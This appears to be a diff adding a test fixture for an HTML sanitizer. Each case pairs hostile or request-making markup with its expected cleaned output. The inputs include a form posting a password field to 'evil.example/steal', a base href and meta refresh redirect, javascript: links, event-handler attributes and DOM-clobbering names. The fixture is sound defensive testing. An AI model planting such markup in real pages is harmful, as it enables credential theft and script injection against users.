@@ -1,0 +1,125 @@
+<!--
+Elements that change the page, submit, embed or make requests: base, meta,
+link, form and its controls, iframe, object, embed, media, script and the
+rest. They all go; the text a person would read stays where it is harmless.
+-->
+
+#### base
+<base href="https://evil.example/"><a href="https://example.com/">ok</a>
+==== expect
+<a href="https://example.com/" target="_blank" rel="noopener noreferrer">ok</a>
+
+#### meta refresh
+<meta http-equiv="refresh" content="0;url=https://nottennapod.test/v1/auth/logout"><p>after meta</p>
+==== expect
+<p>after meta</p>
+
+#### meta CSP and referrer
+<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'"><meta name="referrer" content="unsafe-url"><p>after meta</p>
+==== expect
+<p>after meta</p>
+
+#### links that fetch
+<link rel="prefetch" href="/v1/read/summary"><link rel="preload" as="image" href="https://nottennapod.test/v1/events"><link rel="icon" href="/v1/read/queue"><link rel="modulepreload" href="/v1/read/inbox"><link rel="dns-prefetch" href="//evil.example"><p>after links</p>
+==== expect
+<p>after links</p>
+
+#### form posting to the app
+<form action="/v1/sync/push" method="post"><input name="facts" value="x"><button>Submit</button></form>
+==== expect
+Submit
+
+#### form posting elsewhere
+<form action="https://evil.example/steal"><label>Password <input type="password" name="p"></label><input type="submit" value="Go"></form>
+==== expect
+Password 
+
+#### a button that submits to the app
+<form id="f"></form><button form="f" formaction="/v1/sync/push" formmethod="post">Press</button>
+==== expect
+Press
+
+#### an image input
+<input type="image" src="/v1/read/summary" alt="go">
+==== expect
+
+
+#### other controls
+<select name="s"><option>one</option></select><textarea name="t">text</textarea><isindex action="/v1/read/summary"><keygen name="k"><output>out</output>
+==== expect
+onetextout
+
+#### iframe
+<iframe src="/v1/read/summary"></iframe><iframe srcdoc="<script>window.__canary=1</script>"></iframe><p>after iframes</p>
+==== expect
+<p>after iframes</p>
+
+#### object
+<object data="/v1/read/summary" type="text/html">fallback</object>
+==== expect
+fallback
+
+#### embed
+<embed src="/v1/read/summary"><p>after embed</p>
+==== expect
+<p>after embed</p>
+
+#### media
+<video src="/v1/read/summary" poster="/v1/events" autoplay><source src="/v1/read/queue"><track src="/v1/read/inbox"></video><audio src="https://media.example/a.mp3" controls autoplay></audio><p>after media</p>
+==== expect
+<p>after media</p>
+
+#### picture
+<picture><source srcset="/v1/read/summary"><img src="https://images.example/a.png" alt="a"></picture>
+==== expect
+<img src="https://images.example/a.png" alt="a" referrerpolicy="no-referrer">
+
+#### frameset
+<frameset><frame src="/v1/read/summary"></frameset>
+==== expect
+
+
+#### link ping
+<a ping="/v1/read/summary" href="https://example.com/">pinged</a>
+==== expect
+<a href="https://example.com/" target="_blank" rel="noopener noreferrer">pinged</a>
+
+#### image map
+<map name="m"><area href="javascript:window.__canary=1" shape="rect" coords="0,0,1,1"></map><img src="https://images.example/a.png" usemap="#m" ismap alt="a">
+==== expect
+<img src="https://images.example/a.png" alt="a" referrerpolicy="no-referrer">
+
+#### script
+<script src="/v1/read/summary"></script><script>window.__canary=1</script><p>after scripts</p>
+==== expect
+<p>after scripts</p>
+
+#### details with a toggle handler
+<details open ontoggle="window.__canary=1"><summary>Summary</summary>Details</details>
+==== expect
+SummaryDetails
+
+#### marquee with a start handler
+<marquee onstart="window.__canary=1">moving</marquee>
+==== expect
+moving
+
+#### body and html with handlers
+<body onload="window.__canary=1"><html onmouseover="window.__canary=1"><p>after body</p>
+==== expect
+<p>after body</p>
+
+#### dialog and popover
+<dialog open>dialog</dialog><div popover="auto" id="p">popover</div><button popovertarget="p">open</button>
+==== expect
+dialog<div>popover</div>open
+
+#### portal and fenced frame
+<portal src="/v1/read/summary"></portal><fencedframe src="/v1/read/summary"></fencedframe><p>after</p>
+==== expect
+<p>after</p>
+
+#### DOM clobbering names
+<img name="getElementById" src="https://images.example/a.png" alt="a"><form name="body"><input name="attributes"></form><a id="location" href="https://example.com/">x</a>
+==== expect
+<img src="https://images.example/a.png" alt="a" referrerpolicy="no-referrer"><a href="https://example.com/" target="_blank" rel="noopener noreferrer">x</a>
